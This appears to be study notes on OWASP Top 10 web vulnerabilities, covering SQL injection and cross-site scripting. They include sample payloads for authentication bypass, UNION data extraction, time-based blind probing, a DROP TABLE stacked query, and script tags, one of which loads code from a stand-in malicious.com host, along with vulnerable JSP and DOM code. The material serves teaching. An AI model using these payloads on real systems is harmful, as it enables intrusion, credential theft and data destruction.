
# OWASP TOP 10

## SQLI

- SQL Injection (SQLI) is an attack technique used to exploit vulnerabilities in web applications 
that do not properly validate user input in SQL queries sent to the database. Attackers can use this 
technique to execute malicious SQL queries and obtain sensitive information, such as usernames, passwords, 
and other data stored in the database.

- Types of SQL Injection:
    - Error-based: Exploits SQL code errors to gather information.
    - Time-based: Uses time-delayed queries to extract data.
    - Boolean-based: Employs boolean expressions to obtain additional information.
    - Union-based: Combines two or more queries using the "UNION" clause.
    - Stacked queries: Executes multiple queries in a single statement.

### Examples of SQL Injection exploitation:

#### Authentication bypass:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```

This query always returns true, potentially granting unauthorized access.

#### Data extraction:
```sql
SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admin_users
```
This query combines results from two tables, potentially exposing admin credentials.

#### Time-based blind injection:
```sql
SELECT * FROM users WHERE id = 1 AND IF(SUBSTRING(username,1,1) = 'a', SLEEP(5), 0)
```
If the first character of the username is 'a', the query will delay for 5 seconds, allowing data extraction 
through timing analysis.

#### Inserting malicious data:
```sql
INSERT INTO users (username, email) VALUES ('hacker', 'malicious@email.com'); DROP TABLE users;--')
```
This query inserts a new user and then drops the entire users table.

## XSS

- Cross-Site Scripting (XSS) vulnerability is a type of computer security vulnerability that allows an 
attacker to execute malicious code on a user's web page without their knowledge or consent. 

- This vulnerability enables the attacker to steal personal information, such as usernames, passwords, 
and other confidential data.

- Essentially, an XSS attack involves inserting malicious code into a vulnerable web page, which is then 
executed in the browser of the user accessing that page. The malicious code can be anything from scripts 
that redirect the user to another page to scripts that log keystrokes or form data and send them to a remote server.

There are several types of XSS vulnerabilities, including:
### Reflected XSS: 
This type of XSS occurs when user-provided data is reflected in the HTTP response without proper validation. 
This allows an attacker to inject malicious code into the response, which is then executed in the user's browser.

#### Example of Reflected XSS:

```xml
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>

```
In this example, if an attacker sets the "eid" parameter to `<script>alert('XSS')</script>`, it will execute in the victim's browser

### Stored XSS: 
This type of XSS occurs when an attacker is able to store malicious code in a database or on the web server hosting a vulnerable web page. 
This code is executed every time the page is loaded.

#### Example of Stored XSS:

```xml
<p>I highly recommend this product!</p>
<script src="http://malicious.com/exploit.js"> </script>
```
In this case, the malicious script is stored in the comment section of a retail website and will be executed every time a user views the page

### DOM-Based XSS:

This type of XSS occurs when malicious code is executed in the user's browser through the Document Object Model (DOM). 
This happens when JavaScript code on a web page modifies the DOM in a way that is vulnerable to malicious code injection.

#### Example of DOM-Based XSS:

```JavaScript
var name = document.location.hash.substr(1);
document.write("Hello, " + name);
```

If the URL ends with `#<script>alert('XSS')</script>`, the script will be executed.

